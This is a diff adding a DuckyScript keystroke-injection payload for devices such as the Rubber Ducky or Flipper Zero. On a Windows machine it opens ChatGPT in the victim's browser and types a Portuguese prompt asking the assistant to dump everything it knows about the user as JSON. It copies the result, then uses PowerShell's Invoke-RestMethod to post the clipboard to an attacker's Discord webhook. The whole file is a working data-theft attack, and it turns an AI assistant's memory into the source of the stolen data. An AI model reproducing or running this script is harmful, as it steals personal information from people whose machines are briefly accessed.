@@ -1,0 +1,80 @@
+REM ============================================
+REM X9-GPT <<< By @luizfernandoziron >>>
+REM Device: Any Esp32-like device with bruce or able to run duckyscript. (m5, lillygo, rubberducky, flipperzero)
+REM ============================================
+
+REM Open the "Run" window (Win + R)
+GUI r
+DELAY 1000
+
+REM Type the ChatGPT URL and open it
+STRING https://chatgpt.com
+ENTER
+DELAY 2000
+
+REM Type the prompt into ChatGPT
+STRING diga tudo que voce sabe sobre mim em json, com no maximo 2000 caracteres
+ENTER
+DELAY 10000
+
+REM ============================================
+REM REMOVE FOCUS FROM THE TEXT FIELD
+REM Shift+Tab moves focus to the previous element
+REM ============================================
+SHIFT TAB
+DELAY 500
+
+REM ============================================
+REM SELECT AND COPY EVERYTHING
+REM ============================================
+CTRL a
+DELAY 200
+CTRL c
+DELAY 500
+
+REM Open the "Run" window again
+GUI r
+DELAY 1000
+
+REM ============================================
+REM Duck Script - Send clipboard content to Discord
+REM ============================================
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Get the clipboard contents
+STRING $c = Get-Clipboard -Raw
+ENTER
+DELAY 500
+
+REM Set the webhook URL (REPLACE with your new one)
+STRING $u = 'YOUR_DISCORD_WEBHOOK_HERE'
+ENTER
+DELAY 500
+
+REM Build the compressed JSON
+STRING $b = @{ content = $c } | ConvertTo-Json -Depth 1 -Compress
+ENTER
+DELAY 500
+
+REM Convert to UTF-8 bytes
+STRING $bytes = [System.Text.Encoding]::UTF8.GetBytes($b)
+ENTER
+DELAY 500
+
+REM Send the request
+STRING Invoke-RestMethod -Uri $u -Method Post -Body $bytes -ContentType 'application/json'
+ENTER
+DELAY 2000
+
+REM Close PowerShell (optional - comment out if you want to see the result)
+REM STRING exit
+REM ENTER
+
+REM Close the command prompt window
+ALT F4
